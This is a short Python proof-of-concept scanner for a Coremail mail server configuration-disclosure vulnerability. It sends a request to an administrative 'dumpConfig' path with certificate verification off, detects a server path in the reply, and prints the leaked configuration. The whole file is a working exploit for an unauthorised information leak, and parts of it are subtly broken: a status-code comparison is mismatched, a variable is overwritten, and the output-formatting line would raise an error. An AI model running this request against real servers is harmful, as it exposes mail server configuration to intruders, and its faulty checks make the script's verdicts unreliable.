# coding:utf-8
import requests
requests.packages.urllib3.disable_warnings()

class c2Class(object):
	def __init__(self):
		self.vulname = 'demo'
		self.vulsystem= 'Coremail'
		self.vulversion = 'XT5,XT3/CM5-verision<20190524'
		self.findtime='2019-0614'
		self.refer= 'https://github.com/lowliness9/coremail-poc/blob/master/coremail-ns-2019-0020.py\n https://www.venustech.com.cn/article/1/9331.html\n https://www.venustech.com.cn/article/1/9331.html'
		self.testisok=True

		self.vulpath='/mailsms/s?func=ADMIN:appState&dumpConfig=/'
		self.vulpath2='/apiws/services/'
		self.flag='home/coremail'
		self.recovered1='404'
		self.recovered2='FS_IP_NOT_PERMITTED'
		self.recovered2='No services have been found.'

	def c2Func(self,target):
		status=0
		returnData=''
		if target.startswith(('http://','https://')):
			pass
		else:
			target='http://'+target
		try:
			url=target.strip('/')+self.vulpath
			resp=requests.get(url=url,verify=False,timeout=2)
			if self.flag in resp.text and not (self.recovered1 == resp.status_code or self.recovered2 in resp.text):
				returnData='%s is bad.The vuln is CMXT5-2019-0002.The /'
				'payloa is [%s], the result is [%s].'%(target.strip('/'),url,resp.text.strip()) #
				status=1
		except Exception as e:
			returnData=str(e)
		return status,returnData

if __name__ == '__main__':
	target='192.168.3.12'
	pocObj=c2Class()
	print(pocObj.c2Func(target))
